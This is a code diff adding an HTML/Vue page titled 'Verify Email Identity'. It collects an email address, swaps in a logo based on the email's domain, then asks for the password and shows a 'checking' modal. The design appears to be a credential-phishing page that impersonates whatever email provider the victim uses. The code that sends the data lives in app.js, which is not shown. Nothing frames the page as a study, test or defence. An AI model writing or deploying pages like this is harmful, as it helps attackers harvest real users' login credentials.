@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Email Identity</title>
+  <link rel="stylesheet" href="styles.css"> <!-- Link to external CSS -->
+  <script src="https://cdn.jsdelivr.net/npm/vue@3"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+  <div id="app">
+    <div class="logo-container">
+      <img src="assets/logo1.png" alt="Static Logo"> <!-- Static logo -->
+      <img :src="domainLogo" alt="Dynamic Logo"> <!-- Dynamically updates -->
+    </div>
+    <div v-if="!showPassword">
+      <div class="form-group">
+        <label for="email">{{ localizedText.enterEmail }}</label>
+        <input
+          type="email"
+          id="email"
+          v-model="email"
+          @input="updateLogo"
+          placeholder="Enter your email address"
+        >
+        <p v-if="emailError" class="error-text">Please enter a valid email address.</p>
+      </div>
+      <button @click="requestPassword" :disabled="!isValidEmail">{{ localizedText.next }}</button>
+    </div>
+    <div v-else>
+      <div class="profile-info">
+        <img src="assets/profile-icon.png" alt="Profile Photo"> <!-- Static profile photo -->
+        <span>{{ email }}</span>
+      </div>
+      <div class="form-group" style="margin-top: 20px;"> <!-- Space between email and password -->
+        <label for="password">{{ localizedText.enterPassword }}</label>
+        <input
+          type="password"
+          id="password"
+          v-model="password"
+          placeholder="Enter your password"
+        >
+        <p v-if="passwordError" class="error-text">Password must be at least 5 characters.</p>
+      </div>
+      <button @click="verifyLogin" :disabled="!isValidPassword">{{ localizedText.verify }}</button>
+    </div>
+
+    <div v-if="showModal" class="modal">
+      <div class="modal-content">
+        <p>{{ localizedText.checking }}</p>
+      </div>
+    </div>
+  </div>
+  <script src="app.js"></script> <!-- Link to app.js -->
+</body>
+</html>
